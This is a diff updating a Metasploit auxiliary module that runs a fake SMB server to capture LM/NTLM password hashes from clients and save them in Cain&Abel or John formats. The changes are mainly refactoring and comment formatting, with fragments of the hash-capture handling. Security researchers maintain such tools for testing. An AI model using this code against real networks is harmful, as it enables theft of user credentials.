@@ -1,14 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-require 'msf/core'
-
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::SMB::Server
 
@@ -43,7 +38,7 @@ class Metasploit3 < Msf::Auxiliary
         OptString.new('CAINPWFILE',  [ false, "The local filename to store the hashes in Cain&Abel format", nil ]),
         OptString.new('JOHNPWFILE',  [ false, "The prefix to the local filename to store the hashes in John format", nil ]),
         OptString.new('CHALLENGE',   [ true, "The 8 byte server challenge", "1122334455667788" ])
-      ], self.class )
+      ])
 
     register_advanced_options(
       [
@@ -73,7 +68,7 @@ class Metasploit3 < Msf::Auxiliary
             "The domain name used during smb exchange with SMB_EXTENDED_SECURITY set.",
             "anonymous"
           ])
-      ], self.class)
+      ])
 
   end
 
@@ -91,7 +86,7 @@ class Metasploit3 < Msf::Auxiliary
       return
     end
 
-    #those variables will prevent to spam the screen with identical hashes (works only with ntlmv1)
+    # those variables will prevent to spam the screen with identical hashes (works only with ntlmv1)
     @previous_lm_hash="none"
     @previous_ntlm_hash="none"
     exploit
@@ -109,7 +104,7 @@ class Metasploit3 < Msf::Auxiliary
 
     case cmd
     when CONST::SMB_COM_NEGOTIATE
-      #client set extended security negotiation
+      # client set extended security negotiation
       if pkt['Payload']['SMB'].v['Flags2'] & 0x800 != 0
         smb_cmd_negotiate(c, buff, true)
       else
@@ -119,8 +114,8 @@ class Metasploit3 < Msf::Auxiliary
 
       wordcount = pkt['Payload']['SMB'].v['WordCount']
 
-      #CIFS SMB_COM_SESSION_SETUP_ANDX request without smb extended security
-      #This packet contains the lm/ntlm hashes
+      # CIFS SMB_COM_SESSION_SETUP_ANDX request without smb extended security
+      # This packet contains the lm/ntlm hashes
       if wordcount == 0x0D
         smb_cmd_session_setup(c, buff)
         #CIFS SMB_COM_SESSION_SETUP_ANDX request with smb extended security
@@ -340,7 +335,7 @@ class Metasploit3 < Msf::Auxiliary
       c.put(pkt.to_s)
 
     when NTLM_MESSAGE::Type3
-      #we can process the hash and send a status_logon_failure response packet
+      # we can process the hash and send a status_logon_failure response packet
 
       # Record the remote multiplex ID
       smb[:multiplex_id] = pkt['Payload']['SMB'].v['MultiplexID']
@@ -652,5 +647,4 @@ class Metasploit3 < Msf::Auxiliary
     end
 
   end
-
 end
